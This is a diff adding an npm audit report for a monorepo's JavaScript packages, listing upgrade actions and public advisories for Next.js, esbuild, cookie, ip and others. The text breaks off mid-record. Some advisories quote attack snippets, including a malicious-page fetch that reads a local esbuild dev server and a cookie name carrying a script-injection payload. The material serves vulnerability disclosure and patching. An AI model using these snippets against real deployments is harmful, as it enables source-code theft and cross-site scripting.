@@ -1,0 +1,2819 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112134,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112135,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112644,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112677,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112678,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112911,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@hono/node-server",
+      "target": "1.19.9",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112453,
+          "path": "web__ipai-control-center-docs>nextra>@theguild/remark-mermaid>mermaid>lodash-es",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "lodash-es",
+      "target": "4.17.23",
+      "depth": 5
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112455,
+          "path": "templates__saas-landing>recharts>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "lodash",
+      "target": "4.17.23",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113161,
+          "path": ".>googleapis>googleapis-common>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "qs",
+      "target": "6.15.0",
+      "depth": 4
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1097295,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1099638,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1099638,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1100421,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1100421,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1101438,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1101438,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105461,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105461,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107226,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107226,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107420,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107420,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107512,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107512,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107513,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107513,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108291,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108291,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108953,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108953,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111391,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111391,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112182,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112182,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112592,
+          "path": "templates__saas-landing>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112592,
+          "path": "web__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112593,
+          "path": "web__ai-control-plane>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112593,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112593,
+          "path": "web__odoo-frontend-shell>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112593,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112646,
+          "path": "templates__saas-landing>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112646,
+          "path": "web__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112648,
+          "path": "web__odoo-frontend-shell>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112653,
+          "path": "web__ai-control-plane>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112653,
+          "path": "web__billing-site>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112653,
+          "path": "web__web-backup-subscription-starter>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112990,
+          "path": "templates__saas-landing>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112990,
+          "path": "web__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ip",
+      "resolves": [
+        {
+          "id": 1101851,
+          "path": "web__mobile>react-native>@react-native-community/cli>@react-native-community/cli-doctor>ip",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "web__docs-ai-widget>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1102341,
+          "path": "pkgs__ipai-ai-sdk>vitest>vite>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "web__billing-site>@supabase/ssr>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1103907,
+          "path": "web__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@supabase/auth-js",
+      "resolves": [
+        {
+          "id": 1105091,
+          "path": "web__platform-kit>@supabase/supabase-js>@supabase/auth-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "jsondiffpatch",
+      "resolves": [
+        {
+          "id": 1108189,
+          "path": "web__ai-control-plane>ai>jsondiffpatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "send",
+      "resolves": [
+        {
+          "id": 1109556,
+          "path": "web__mobile>expo>@expo/cli>send",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nanoid",
+      "resolves": [
+        {
+          "id": 1109563,
+          "path": "web__ai-control-plane>@ai-sdk/openai>@ai-sdk/provider-utils>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1109804,
+          "path": "templates__saas-landing>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113165,
+          "path": "templates__saas-landing>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": "templates__odooops-console>jest>@jest/core>@jest/reporters>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ai",
+      "resolves": [
+        {
+          "id": 1111095,
+          "path": "web__ai-control-plane>ai",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@modelcontextprotocol/sdk",
+      "resolves": [
+        {
+          "id": 1111906,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113080,
+          "path": "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@remix-run/server-runtime",
+      "resolves": [
+        {
+          "id": 1112050,
+          "path": "web__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@remix-run/router",
+      "resolves": [
+        {
+          "id": 1112052,
+          "path": "web__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime>@remix-run/router",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@remix-run/node",
+      "resolves": [
+        {
+          "id": 1112059,
+          "path": "web__mobile>expo-router>@expo/server>@remix-run/node",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tar",
+      "resolves": [
+        {
+          "id": 1112255,
+          "path": "web__mobile>expo>@expo/cli>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112255,
+          "path": "web__platform-kit>supabase>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112329,
+          "path": "web__mobile>expo>@expo/cli>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112329,
+          "path": "web__platform-kit>supabase>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112659,
+          "path": "web__mobile>expo>@expo/cli>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112659,
+          "path": "web__platform-kit>supabase>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "lodash-es",
+      "resolves": [
+        {
+          "id": 1112453,
+          "path": "web__ipai-control-center-docs>nextra>@theguild/remark-mermaid>mermaid>@mermaid-js/parser>langium>chevrotain>lodash-es",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "undici",
+      "resolves": [
+        {
+          "id": 1112496,
+          "path": "pkgs__github-app>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "semver",
+      "resolves": [
+        {
+          "id": 1112921,
+          "path": "web__mobile>expo>@expo/cli>@expo/image-utils>semver",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "axios",
+      "resolves": [
+        {
+          "id": 1113092,
+          "path": "web__odoo-frontend-shell>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1097295": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g\n- https://github.com/vercel/next.js/pull/62561\n- https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085\n- https://nvd.nist.gov/vuln/detail/CVE-2024-34351\n- https://github.com/advisories/GHSA-fr5h-rqp8-mj6g",
+      "created": "2024-05-09T21:18:57.000Z",
+      "id": 1097295,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA Server-Side Request Forgery (SSRF) vulnerability was identified in Next.js Server Actions by security researchers at Assetnote. If the `Host` header is modified, and the below conditions are also met, an attacker may be able to make requests that appear to be originating from the Next.js application server itself.\n\n#### Prerequisites\n* Next.js (`<14.1.1`) is running in a self-hosted* manner.\n* The Next.js application makes use of Server Actions.\n* The Server Action performs a redirect to a relative path which starts with a `/`.\n\n\\* Many hosting providers (including Vercel) route requests based on the Host header, so we do not believe that this vulnerability affects any Next.js applications where routing is done in this manner.\n\n### Patches\nThis vulnerability was patched in [#62561](https://github.com/vercel/next.js/pull/62561) and fixed in Next.js `14.1.1`.\n \n### Workarounds\nThere are no official workarounds for this vulnerability. We recommend upgrading to Next.js `14.1.1`.\n\n### Credit\nVercel and the Next.js team thank Assetnote for responsibly disclosing this issue to us, and for working with us to verify the fix. Thanks to:\n\nAdam Kues - Assetnote\nShubham Shah - Assetnote",
+      "reported_by": null,
+      "title": "Next.js Server-Side Request Forgery in Server Actions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-34351"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.4.0 <14.1.1",
+      "github_advisory_id": "GHSA-fr5h-rqp8-mj6g",
+      "recommendation": "Upgrade to version 14.1.1 or later",
+      "patched_versions": ">=14.1.1",
+      "updated": "2024-05-14T20:02:43.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-fr5h-rqp8-mj6g"
+    },
+    "1099638": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9\n- https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3\n- https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda\n- https://nvd.nist.gov/vuln/detail/CVE-2024-46982\n- https://github.com/advisories/GHSA-gp8f-8m3g-qvj9",
+      "created": "2024-09-17T21:58:09.000Z",
+      "id": 1099638,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nBy sending a crafted HTTP request, it is possible to poison the cache of a non-dynamic server-side rendered route in the pages router (this does not affect the app router). When this crafted request is sent it could coerce Next.js to cache a route that is meant to not be cached and send a `Cache-Control: s-maxage=1, stale-while-revalidate` header which some upstream CDNs may cache as well. \n\nTo be potentially affected all of the following must apply: \n\n- Next.js between 13.5.1 and 14.2.9\n- Using pages router\n- Using non-dynamic server-side rendered routes e.g. `pages/dashboard.tsx` not `pages/blog/[slug].tsx`\n\nThe below configurations are unaffected:\n\n- Deployments using only app router\n- Deployments on [Vercel](https://vercel.com/) are not affected\n\n\n### Patches\n\nThis vulnerability was resolved in Next.js v13.5.7, v14.2.10, and later. We recommend upgrading regardless of whether you can reproduce the issue or not.\n\n### Workarounds\n\nThere are no official or recommended workarounds for this issue, we recommend that users patch to a safe version.\n\n#### Credits\n\n- Allam Rachid (zhero_)\n- Henry Chen",
+      "reported_by": null,
+      "title": "Next.js Cache Poisoning",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-46982"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.10",
+      "github_advisory_id": "GHSA-gp8f-8m3g-qvj9",
+      "recommendation": "Upgrade to version 14.2.10 or later",
+      "patched_versions": ">=14.2.10",
+      "updated": "2024-09-18T14:28:58.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-349",
+        "CWE-639"
+      ],
+      "url": "https://github.com/advisories/GHSA-gp8f-8m3g-qvj9"
+    },
+    "1100421": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g77x-44xx-532m\n- https://nvd.nist.gov/vuln/detail/CVE-2024-47831\n- https://github.com/vercel/next.js/commit/d11cbc9ff0b1aaefabcba9afe1e562e0b1fde65a\n- https://github.com/advisories/GHSA-g77x-44xx-532m",
+      "created": "2024-10-14T19:45:21.000Z",
+      "id": 1100421,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nThe image optimization feature of Next.js contained a vulnerability which allowed for a potential Denial of Service (DoS) condition which could lead to excessive CPU consumption.\n\n**Not affected:**\n- The `next.config.js` file is configured with `images.unoptimized` set to `true` or `images.loader` set to a non-default value.\n- The Next.js application is hosted on Vercel. \n\n### Patches\nThis issue was fully patched in Next.js `14.2.7`. We recommend that users upgrade to at least this version.\n\n### Workarounds\nEnsure that the `next.config.js` file has either `images.unoptimized`, `images.loader` or `images.loaderFile` assigned.\n\n#### Credits\nBrandon Dahler (brandondahler), AWS\nDimitrios Vlastaras",
+      "reported_by": null,
+      "title": "Denial of Service condition in Next.js image optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47831"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <14.2.7",
+      "github_advisory_id": "GHSA-g77x-44xx-532m",
+      "recommendation": "Upgrade to version 14.2.7 or later",
+      "patched_versions": ">=14.2.7",
+      "updated": "2024-11-08T18:55:49.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-g77x-44xx-532m"
+    },
+    "1101438": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9\n- https://nvd.nist.gov/vuln/detail/CVE-2024-56332\n- https://github.com/advisories/GHSA-7m27-7ghc-44w9",
+      "created": "2025-01-03T20:19:29.000Z",
+      "id": 1101438,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.\n\n_Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time._\n\nDeployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.\n\nThis is the same issue as if the incoming HTTP request has an invalid `Content-Length` header or never closes. If the host has no other mitigations to those then this vulnerability is novel.\n\nThis vulnerability affects only Next.js deployments using Server Actions.\n\n### Patches\n\nThis vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.\n\n### Workarounds\n\nThere are no official workarounds for this vulnerability.\n\n### Credits\n\nThanks to the PackDraw team for responsibly disclosing this vulnerability.",
+      "reported_by": null,
+      "title": "Next.js Allows a Denial of Service (DoS) with Server Actions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-56332"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.21",
+      "github_advisory_id": "GHSA-7m27-7ghc-44w9",
+      "recommendation": "Upgrade to version 14.2.21 or later",
+      "patched_versions": ">=14.2.21",
+      "updated": "2025-01-07T16:24:09.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-7m27-7ghc-44w9"
+    },
+    "1101851": {
+      "findings": [
+        {
+          "version": "1.1.9",
+          "paths": [
+            "web__mobile>react-native>@react-native-community/cli>@react-native-community/cli-doctor>ip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-29415\n- https://github.com/indutny/node-ip/issues/150\n- https://github.com/indutny/node-ip/pull/143\n- https://github.com/indutny/node-ip/pull/144\n- https://security.netapp.com/advisory/ntap-20250117-0010\n- https://github.com/advisories/GHSA-2p57-rm9w-gvfp",
+      "created": "2024-06-02T22:29:29.000Z",
+      "id": 1101851,
+      "npm_advisory_id": null,
+      "overview": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282.",
+      "reported_by": null,
+      "title": "ip SSRF improper categorization in isPublic",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-29415"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "ip",
+      "vulnerable_versions": "<=2.0.1",
+      "github_advisory_id": "GHSA-2p57-rm9w-gvfp",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-01-17T21:31:39.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-2p57-rm9w-gvfp"
+    },
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.19.12",
+          "paths": [
+            "web__docs-ai-widget>esbuild"
+          ]
+        },
+        {
+          "version": "0.21.5",
+          "paths": [
+            "pkgs__ipai-ai-sdk>vitest>vite>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.5.0",
+          "paths": [
+            "web__billing-site>@supabase/ssr>cookie"
+          ]
+        },
+        {
+          "version": "0.4.2",
+          "paths": [
+            "web__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime>cookie"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1105091": {
+      "findings": [
+        {
+          "version": "2.67.3",
+          "paths": [
+            "web__platform-kit>@supabase/supabase-js>@supabase/auth-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
